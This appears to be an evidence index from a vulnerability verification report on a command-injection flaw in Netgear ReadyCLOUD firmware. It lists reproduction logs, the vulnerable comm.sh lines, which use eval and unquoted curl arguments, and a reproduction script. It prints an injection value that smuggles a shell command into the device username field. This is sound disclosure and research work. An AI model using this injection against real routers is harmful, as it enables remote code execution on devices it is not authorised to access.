# Evidence Index

## Core Dynamic Evidence

### Initial reproduction

File:

```text
evidence_leafp2p_to_comm_rce.txt
```

Key contents:

```text
Using routeruser; /bin/touch /tmp/pwned; # as device username
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
curl --basic -k --user routeruser
[pwned]
-rw-r--r-- ... /tmp/pwned
```

Purpose:

- Proves `readycloud_control.cgi` reads the malicious `leafp2p_username`.
- Proves it writes the value into `readycloud_hostname`.
- Proves `comm.sh` reaches the unquoted `curl --user` command.
- Proves the injected `/bin/touch /tmp/pwned` command executes.

### Fresh reruns

Files:

```text
evidence_leafp2p_to_comm_rce_rerun_1.txt
evidence_leafp2p_to_comm_rce_rerun_2.txt
```

Purpose:

- Proves reproducibility after re-extracting the original firmware image.
- Both reruns created `/tmp/pwned` inside separate work rootfs directories.

## Static Evidence

### comm.sh numbered source

File:

```text
static_comm_sh_numbered.txt
```

Key lines:

```text
14  NAS_NAME=`readycloud_nvram get readycloud_hostname`
15  NAS_PASS=`readycloud_nvram get readycloud_password`
20  COMM_EXEC="curl --basic -k --user ${NAS_NAME}:${NAS_PASS} --url ${URL}"
46  FULL_EXEC="`cat "${1}" | ${COMM_EXEC} -X POST --data-binary @- 2>/dev/null`"
53  eval COMM_RESULT="${FULL_EXEC}" || return $ERROR
```

Purpose:

- Identifies the command-injection sink.
- Shows the NVRAM-derived values are not shell-quoted.
- Shows `eval` is used.

### readycloud_control.cgi strings

File:

```text
static_readycloud_control_strings.txt
```

Key strings:

```text
leafp2p_username
readycloud_hostname
leafp2p_password
readycloud_password
/register.sh
Calling register.sh with line
```

Purpose:

- Supports the observed propagation from LeafP2P credentials into ReadyCLOUD hostname/password state.
- Supports the transition into `register.sh`.

## Reproduction Script

File:

```text
verify_netgear_readycloud_leafp2p_to_comm_rce.sh
```

Purpose:

- Builds the NVRAM shim.
- Recreates the ReadyCLOUD registration call.
- Logs all relevant state transitions.
- Verifies `/tmp/pwned`.

## Prior Verification Report

File:

```text
source_verification_report.md
```

Purpose:

- Records the original analysis and the final stability/duplicate/CVE-value conclusion.

## Target Hashes

File:

```text
target_hashes.txt
```

Purpose:

- Documents hashes of the key firmware files used for static and dynamic verification.

